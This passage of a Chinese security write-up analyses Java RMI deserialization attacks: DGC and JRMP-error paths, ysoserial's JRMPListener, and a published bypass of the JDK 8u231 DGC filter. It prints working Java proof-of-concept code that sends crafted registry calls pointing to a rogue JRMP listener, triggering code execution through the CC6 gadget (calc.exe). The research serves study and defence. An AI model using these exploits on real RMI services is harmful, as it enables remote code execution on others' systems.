        <span class="token class-name">Object</span> payloadObject <span class="token operator">=</span> <span class="token constant">CC6</span><span class="token punctuation">.</span><span class="token function">getPayloadObject</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">ObjID</span> objID <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RemoteUtils</span><span class="token punctuation">.</span><span class="token function">sendRawCall</span><span class="token punctuation">(</span>remoteObj<span class="token punctuation">.</span><span class="token function">getHost</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> remoteObj<span class="token punctuation">.</span><span class="token function">getPort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  objID<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">669196253586618813L</span><span class="token punctuation">,</span>payloadObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br></div></div><p>效果如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_ec35deef18ffabbb2182fef79481adff.png" alt=""></p> <p>不过同样也会被JEP290拦截，原理是类似的，oracle在dgc层也做了反序列化过滤</p> <p><img src="https://md.buptmerak.cn/uploads/upload_8d06ad7729aad1d14562ad42b6b7372f.png" alt=""></p> <h3 id="远程方法报错信息导致的反序列化-jrmp协议引发的反序列化"><a href="#远程方法报错信息导致的反序列化-jrmp协议引发的反序列化" class="header-anchor">#</a> 远程方法报错信息导致的反序列化（JRMP协议引发的反序列化）</h3> <p>如果我们仔细观察上文中的流量包的话，会发现每次对远程对象的调用都伴随着一个<code>JRMI,Call</code>。这个流量包是从哪发出去的呢。在客户端<code>UnicastRef</code>调用<code>excuteCall</code>时，我们找到了这个类方法。</p> <p>Response:</p> <p>|returnValue|<strong>returnType</strong>|<strong>uuid</strong>|<strong>object</strong>|</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">executeCall</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
        <span class="token class-name">DGCAckHandler</span> var2 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>

        <span class="token keyword">byte</span> var1<span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>out <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">getDGCAckHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">releaseOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">DataInputStream</span> var3 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>conn<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            
			<span class="token comment">//var4: return value;</span>
			<span class="token keyword">byte</span> var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token comment">//81=0x51 正常返回</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4 <span class="token operator">!=</span> <span class="token number">81</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Transport</span><span class="token punctuation">.</span>transportLog<span class="token punctuation">.</span><span class="token function">isLoggable</span><span class="token punctuation">(</span><span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token constant">BRIEF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token class-name">Transport</span><span class="token punctuation">.</span>transportLog<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token class-name">Log</span><span class="token punctuation">.</span><span class="token constant">BRIEF</span><span class="token punctuation">,</span> <span class="token string">&quot;transport return code invalid: &quot;</span> <span class="token operator">+</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">&quot;Transport return code invalid&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token comment">//return Type</span>
            var1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">readID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnmarshalException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> var11<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">UnmarshalException</span><span class="token punctuation">(</span><span class="token string">&quot;Error unmarshaling return header&quot;</span><span class="token punctuation">,</span> var12<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>var2 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                var2<span class="token punctuation">.</span><span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>
		
        <span class="token keyword">switch</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
            <span class="token class-name">Object</span> var14<span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
                var14 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var10<span class="token punctuation">)</span> <span class="token punctuation">{</span>
			<span class="token operator">/</span>省略一些错误处理
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br></div></div><p>可以看到正常情况下return Type为1，</p> <p><img src="https://md.buptmerak.cn/uploads/upload_133e77cdc68464df3cf5443a94d180d1.png" alt=""></p> <p>错误状态下return Type 为2,触发反序列化</p> <p><img src="https://md.buptmerak.cn/uploads/upload_de2366476715294a30dd66da77cad2af.png" alt=""></p> <p>那么我们的攻击路径也很明确了，就是客户端调用服务端远程方法，然后服务端返回恶意报错信息就可以触发反序列化了。因此我们需要编写一个假的服务端，<code>ysoserial</code>的<code>JRMPListener</code>就实现了这一点。具体可以看源码：
https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java</p> <p>简单来说，就是启动一个Socket Listener,当远程客户端向Listener发起JRMP Call请求时,根据JRMP格式返回一个报错信息，将恶意的序列化数据放在数据包的object字段中，触发客户端的反序列化（这里的客户端指的是远程方法调用的客户端，可以指Client调Server也可以指Server调Registry）</p> <p><img src="https://md.buptmerak.cn/uploads/upload_75e3d60d70a80afdab13ff788cdf76b7.png" alt=""></p> <p>发现反序列化成功了，有趣的是，即使在高版本下也会生效（这里是jdk8u251）。这是因为JEP 290只是在JRMP之上的反序列化过程中注入了Filter，而在JRMP层对错误的处理没有进行反序列化过滤。</p> <p>具体的流量交互过程如下。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_4f378c04c69e397dac1d539f75550739.png" alt=""></p> <p>那么，我们还可以联想到之前Server访问Registry去bind远程对象的时候的时候，Server先调用了Registry，Registry再访问Server发了一个DGC请求。我们知道，DGC协议也是建立在JRMP协议之上的，这就会触发一个JRMI CALL，进入我们的攻击流程中。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_962a87b0f009668a3d3ebc2f117bb4ee.png" alt=""></p> <p>这里借用An Trinhs文章里的图</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AttackRegistryByJRMPListener</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> registryHost <span class="token operator">=</span> <span class="token string">&quot;192.168.111.1&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> registryPort <span class="token operator">=</span> <span class="token number">21099</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> <span class="token class-name">JRMPHost</span> <span class="token operator">=</span> <span class="token string">&quot;192.168.111.1&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">int</span> <span class="token class-name">JRMPPort</span> <span class="token operator">=</span> <span class="token number">16999</span><span class="token punctuation">;</span>

            <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> constructor <span class="token operator">=</span> <span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//因为UnicastRemoteObject的默认构造方式是protect的，所以需要反射调用</span>

            <span class="token class-name">UnicastRemoteObject</span> remoteObject <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">TCPEndpoint</span> ep <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">TCPEndpoint</span><span class="token punctuation">)</span> <span class="token function">getFieldValve</span><span class="token punctuation">(</span><span class="token function">getFieldValve</span><span class="token punctuation">(</span><span class="token function">getFieldValve</span><span class="token punctuation">(</span>remoteObject<span class="token punctuation">,</span><span class="token string">&quot;ref&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;ref&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">&quot;ep&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//这里直接反射修改对应的值，间接修改构造的序列化数据</span>
            <span class="token function">setFieldValue</span><span class="token punctuation">(</span>ep<span class="token punctuation">,</span><span class="token string">&quot;port&quot;</span><span class="token punctuation">,</span><span class="token class-name">JRMPPort</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">setFieldValue</span><span class="token punctuation">(</span>ep<span class="token punctuation">,</span><span class="token string">&quot;host&quot;</span><span class="token punctuation">,</span><span class="token class-name">JRMPHost</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


            <span class="token class-name">ObjID</span> objID_ <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//Bind(&quot;test&quot;,payloadObj)</span>
            <span class="token class-name">RemoteUtils</span><span class="token punctuation">.</span><span class="token function">sendRawCall</span><span class="token punctuation">(</span>registryHost<span class="token punctuation">,</span>registryPort<span class="token punctuation">,</span>objID_<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4905912898345647071L</span><span class="token punctuation">,</span><span class="token string">&quot;test&quot;</span><span class="token punctuation">,</span>remoteObject<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> t<span class="token punctuation">)</span><span class="token punctuation">{</span>
            t<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br></div></div><p>效果如下，而且会因为Registry一直想要DGC Lease 会不断发DGC Call到JRMP Listener 触发反序列化导致计算器一直执行。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_a6200bc249055a909945142d50ed890e.png" alt=""></p> <p>流量过程如下</p> <p><img src="https://md.buptmerak.cn/uploads/upload_b45a978a0709334c9047f7e8094acd4f.png" alt=""></p> <p>不过在8u231之后，这个问题也得到了修复</p> <p>因为在之前的流量分析中我们知道，实际上在bind时，我们对Server发的是一个DGC Dirty Call。我们跟进这个类
<code>sun.rmi.transport.DGCImpl_Stub</code>发现<code>leaseFilter</code>方法会对其进行过滤</p> <p><img src="https://md.buptmerak.cn/uploads/upload_65c45622a091277e1841eb9219c8a328.png" alt=""></p> <p>一个是判断反序列化深度一个是判断反序列化类型</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">return</span> 
var1 <span class="token operator">!=</span> <span class="token constant">UID</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span>
var1 <span class="token operator">!=</span> <span class="token constant">VMID</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
var1 <span class="token operator">!=</span> <span class="token class-name">Lease</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 

<span class="token punctuation">(</span>
var1<span class="token punctuation">.</span><span class="token function">getPackage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span>
<span class="token operator">!</span><span class="token class-name">Throwable</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span> <span class="token operator">||</span>
<span class="token operator">!</span><span class="token string">&quot;java.lang&quot;</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">getPackage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
<span class="token operator">!</span><span class="token string">&quot;java.rmi&quot;</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">getPackage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span>

var1 <span class="token operator">!=</span> <span class="token class-name">StackTraceElement</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span>
var1 <span class="token operator">!=</span> <span class="token class-name">ArrayList</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span>
var1 <span class="token operator">!=</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span>
<span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;java.util.Collections$UnmodifiableList&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
<span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;java.util.Collections$UnmodifiableCollection&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
<span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>
<span class="token operator">!</span>var1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">&quot;java.util.Collections$EmptyList&quot;</span><span class="token punctuation">)</span>

<span class="token operator">?</span> <span class="token class-name">Status</span><span class="token punctuation">.</span><span class="token constant">REJECTED</span> <span class="token operator">:</span> <span class="token class-name">Status</span><span class="token punctuation">.</span><span class="token constant">ALLOWED</span><span class="token punctuation">;</span>

</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>导致我们构造的payload被过滤拦截
<img src="https://md.buptmerak.cn/uploads/upload_a59679776500670a36204c3d82282e8f.png" alt=""></p> <p>针对这个问题，An Trinh提出了一种绕过方式：在上述流程图第一步readObject的时候触发一个JRMP CALL来触发我们的JRMP Listener而不是等到之后的DGC CALL，这样就可以绕过DGC CALL回传中的反序列化过滤。</p> <p>An Trinh用到的是<code>UnicastRemoteObject</code>，我们发现这个类自带一个readObject</p> <p><img src="https://md.buptmerak.cn/uploads/upload_b7dea42125f3a50590a701d822458af1.png" alt=""></p> <p>跟进会发现reexport,如果我们有ssf获csf会进入exportObject这个分支，然后继续跟，调用链如下图所示：</p> <p><img src="https://md.buptmerak.cn/uploads/upload_e5a8ccebddbac85e7bfcc17621d13968.png" alt=""></p> <p>这里的ssf是我们可控的，调用<code>var1.createServerSocket</code></p> <p><img src="https://md.buptmerak.cn/uploads/upload_1ae38f3670e73e41776f367f22852261.png" alt=""></p> <p>这里<code>An Trinh</code>把ssf设置为通过<code>RemoteObjectInvocationHandler</code>生成的动态代理类，</p> <p>我们知道在如果调用通过InvocationHandler的实现类生成的代理类，那么会转而调用实现类的invoke方法。</p> <p>那么就会调用到<code>RemoteObjectInvocationHandler.invoke</code>方法最终调用invokeRemoteMethod方法，并触发一个<code>UnicastRef.invoke</code>发起一个JRMP请求</p> <p><img src="https://md.buptmerak.cn/uploads/upload_71042c126f9e767a92c0613fd8244f01.png" alt=""></p> <p>之后就和我们在上文所讨论的例子一样了。完整的poc如下</p> <div class="language-java line-numbers-mode"><pre class="language-java"><code><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TriggerJRMPCallByDeserialize</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> registryHost <span class="token operator">=</span> <span class="token string">&quot;192.168.111.1&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> registryPort <span class="token operator">=</span> <span class="token number">21099</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> <span class="token class-name">JRMPHost</span> <span class="token operator">=</span> <span class="token string">&quot;192.168.111.1&quot;</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> <span class="token class-name">JRMPPort</span> <span class="token operator">=</span> <span class="token number">16999</span><span class="token punctuation">;</span>

        <span class="token class-name">TCPEndpoint</span> te <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TCPEndpoint</span><span class="token punctuation">(</span><span class="token class-name">JRMPHost</span><span class="token punctuation">,</span> <span class="token class-name">JRMPPort</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjID</span> id <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjID</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">UnicastRef</span> refObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UnicastRef</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">LiveRef</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span> te<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//触发关键在于RemoteObjectInvocationHandler </span>
        <span class="token class-name">RemoteObjectInvocationHandler</span> myInvocationHandler <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RemoteObjectInvocationHandler</span><span class="token punctuation">(</span>refObject<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">RMIServerSocketFactory</span> handcraftedSSF <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">RMIServerSocketFactory</span><span class="token punctuation">)</span> <span class="token class-name">Proxy</span><span class="token punctuation">.</span><span class="token function">newProxyInstance</span><span class="token punctuation">(</span>
                <span class="token class-name">RMIServerSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">RMIServerSocketFactory</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span>Remote</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token punctuation">}</span><span class="token punctuation">,</span>
                myInvocationHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Constructor</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> constructor <span class="token operator">=</span> <span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">UnicastRemoteObject</span> remoteObject <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">UnicastRemoteObject</span><span class="token punctuation">)</span> constructor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>remoteObject<span class="token punctuation">,</span> <span class="token string">&quot;ssf&quot;</span><span class="token punctuation">,</span> handcraftedSSF<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> serializeData <span class="token operator">=</span>  <span class="token class-name">ReflectUtils<span class="token punctuation">.</span>WriteObjectToBytes</span><span class="token punctuation">(</span>remoteObject<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ReflectUtils</span><span class="token punctuation">.</span><span class="token function">readObjectFromBytes</span><span class="token punctuation">(</span>serializeData<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>本地反序列化时，可以看到成功触发，而且还是在u231比较高版本的情况下。</p> <p><img src="https://md.buptmerak.cn/uploads/upload_e0fbccd30d7dda60185172bbfac28e4d.png" alt=""></p> 